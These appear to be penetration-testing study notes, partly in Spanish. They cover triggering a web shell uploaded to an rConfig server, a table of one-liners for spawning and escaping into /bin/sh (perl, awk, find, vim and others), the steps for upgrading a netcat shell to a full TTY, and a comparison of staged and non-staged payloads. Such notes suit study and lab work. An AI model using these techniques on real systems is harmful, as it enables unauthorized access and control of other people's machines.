	- The message: Added new vendor NetVen to Database lets us know our file upload was successful. We can also see the NetVen vendor entry with the logo showcasing a ripped piece of paper. This means rConfig did not recognize the file type as an image, so it defaulted to that image. We can now attempt to use our web shell. Using the browser, navigate to this directory on the rConfig server:
                `/images/vendor/connect.php`
	- This executes the payload and provides us with a non-interactive shell session entirely in the browser, allowing us to execute commands on the underlying OS.
        

## Upgrading shell
### Linux
There may be times that _we land on a system with a limited shell, and Python is not installed_. In these cases, it's good to know that we could use several different methods to spawn an interactive shell. Let's examine some of them.
Know that whenever we see /bin/sh or /bin/bash, this could also be replaced with the binary associated with the shell interpreter language present on that system. With most Linux systems, we will likely come across bourne shell (/bin/sh) and bourne again shell (/bin/bash) present on the system natively.
/bin/sh -i  | This command will execute the shell interpreter specified in the path in interactive mode (-i).

Option  | Description
-- | --
perl —e 'exec "/bin/sh";' | With Perl installed
perl: exec "/bin/sh"; | The command should be run from a script.
ruby: exec "/bin/sh" | If the programming language Ruby is present on the system, this command will execute the shell interpreter specified. The command should be run from a script.
lua: ox.execute('/bin/sh') | If the programming language Lua is present on the system, we can use the os.execute method to execute the shell interpreter. The command should be run from a script.
awk 'BEGIN {system("/bin/sh")}' | AWK is a C-like pattern scanning and processing language present on most UNIX/Linux-based systems, widely used by developers and sysadmins to generate reports. It can also be used to spawn an interactive shell. 
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \; | Find command
find . -exec /bin/sh \; -quit | Find command
vim -c ':!/bin/sh' | Vim to shell
vim , :set shell=/bin/sh , :shell | Vim escape

#### Common way
```bash
script /dev/null -c bash OR whereis python and python -c 'import pty;pty.spawn("/bin/bash")'
ctrl + z 
stty raw -echo
fg // Once we hit fg, it will bring back our netcat shell to the foreground. At this point, the terminal will show a blank line. We can hit enter again to get back to our shell or input reset and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.
reset 
xterm 
export TERM=xterm or xterm-256color //In our machine echo $TERM
export SHELL=bash
stty -a //In our terminal to check our screen dimension
stty rows [x] cols [x]
```

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.

### Windows
#### Powershell
```powershell
rlwrap nc -lvnp <port>
stty raw -echo;fg 
```

## Payload types
For additional information [Types of payloads](Metasploit.md#Types%20of%20payloads)
- **Payload Staged**: Es un tipo de payload que se **divide en dos** **o más etapas**. La primera etapa es una pequeña parte del código que se envía al objetivo, cuyo propósito es establecer una conexión segura entre el atacante y la máquina objetivo. Una vez que se establece la conexión, el atacante envía la segunda etapa del payload, que es la carga útil real del ataque. Este enfoque permite a los atacantes sortear medidas de seguridad adicionales, ya que la carga útil real no se envía hasta que se establece una conexión segura.
- **Payload Non-Staged**: Es un tipo de payload que se envía como **una sola entidad** y **no se divide en múltiples etapas**. La carga útil completa se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este enfoque es más simple que el Payload Staged, pero también es más fácil de detectar por los sistemas de seguridad, ya que se envía todo el código malicioso de una sola vez.

Es importante tener en cuenta que el tipo de payload utilizado en un ataque dependerá del objetivo y de las medidas de seguridad implementadas. En general, los payloads Staged son más difíciles de detectar y son preferidos por los atacantes, mientras que los payloads Non-Staged son más fáciles de implementar pero también son más fáciles de detectar.